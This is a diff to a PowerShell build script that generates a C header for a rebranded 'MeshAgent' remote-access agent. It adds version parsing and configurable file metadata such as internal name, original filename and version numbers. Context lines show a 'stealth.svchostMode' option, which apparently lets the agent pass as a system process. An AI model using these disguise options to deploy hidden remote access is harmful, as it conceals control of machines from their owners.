@@ -28,6 +28,36 @@ if ($config.stealth.svchostMode -and -not $bundleExtractFlag) {
 }
 $config.stealth.bundleExtract = $bundleExtractFlag
 
+function Get-VersionParts {
+    param([string]$version)
+    if ([string]::IsNullOrWhiteSpace($version)) {
+        $version = "0.0.0.0"
+    }
+    $tokens = $version.Split('.', 4)
+    $parts = @()
+    foreach ($token in $tokens) {
+        if ($token -match '^\d+$') {
+            $parts += [int]$token
+        } else {
+            $match = [regex]::Match($token, '\d+')
+            if ($match.Success) {
+                $parts += [int]$match.Value
+            } else {
+                $parts += 0
+            }
+        }
+    }
+    while ($parts.Count -lt 4) { $parts += 0 }
+    return $parts[0..3]
+}
+
+$fileVersionStr = if ($config.branding.versionInfo.fileVersion) { $config.branding.versionInfo.fileVersion } else { "1.0.0.0" }
+$productVersionStr = if ($config.branding.versionInfo.productVersion) { $config.branding.versionInfo.productVersion } else { $fileVersionStr }
+$fileVersionParts = Get-VersionParts $fileVersionStr
+$productVersionParts = Get-VersionParts $productVersionStr
+$internalName = if ($config.branding.versionInfo.internalName) { $config.branding.versionInfo.internalName } else { $config.branding.binaryName }
+$originalFilename = if ($config.branding.versionInfo.originalFilename) { $config.branding.versionInfo.originalFilename } else { $internalName }
+
 # Generate header
 $header = @"
 /* Generated file - do not edit. */
@@ -47,11 +77,33 @@ $header = @"
 #undef MESH_AGENT_FILE_DESCRIPTION
 #define MESH_AGENT_FILE_DESCRIPTION "$($config.branding.description)"
 #undef MESH_AGENT_INTERNAL_NAME
-#define MESH_AGENT_INTERNAL_NAME "$($config.branding.versionInfo.internalName)"
+#define MESH_AGENT_INTERNAL_NAME "$($internalName)"
 #undef MESH_AGENT_COPYRIGHT
 #define MESH_AGENT_COPYRIGHT "$($config.branding.versionInfo.legalCopyright)"
+#undef MESH_AGENT_ORIGINAL_FILENAME
+#define MESH_AGENT_ORIGINAL_FILENAME "$($originalFilename)"
 #undef MESH_AGENT_LOG_DIRECTORY
 #define MESH_AGENT_LOG_DIRECTORY TEXT("$($config.branding.logPath)")
+#undef MESH_AGENT_FILE_VERSION_MAJOR
+#define MESH_AGENT_FILE_VERSION_MAJOR $($fileVersionParts[0])
+#undef MESH_AGENT_FILE_VERSION_MINOR
+#define MESH_AGENT_FILE_VERSION_MINOR $($fileVersionParts[1])
+#undef MESH_AGENT_FILE_VERSION_BUILD
+#define MESH_AGENT_FILE_VERSION_BUILD $($fileVersionParts[2])
+#undef MESH_AGENT_FILE_VERSION_REVISION
+#define MESH_AGENT_FILE_VERSION_REVISION $($fileVersionParts[3])
+#undef MESH_AGENT_FILE_VERSION_STR
+#define MESH_AGENT_FILE_VERSION_STR TEXT("$fileVersionStr")
+#undef MESH_AGENT_PRODUCT_VERSION_MAJOR
+#define MESH_AGENT_PRODUCT_VERSION_MAJOR $($productVersionParts[0])
+#undef MESH_AGENT_PRODUCT_VERSION_MINOR
+#define MESH_AGENT_PRODUCT_VERSION_MINOR $($productVersionParts[1])
+#undef MESH_AGENT_PRODUCT_VERSION_BUILD
+#define MESH_AGENT_PRODUCT_VERSION_BUILD $($productVersionParts[2])
+#undef MESH_AGENT_PRODUCT_VERSION_REVISION
+#define MESH_AGENT_PRODUCT_VERSION_REVISION $($productVersionParts[3])
+#undef MESH_AGENT_PRODUCT_VERSION_STR
+#define MESH_AGENT_PRODUCT_VERSION_STR TEXT("$productVersionStr")
 
 /* ========== Network Configuration ========== */
 #define MESH_AGENT_NETWORK_ENDPOINT "$($config.network.primaryEndpoint)"
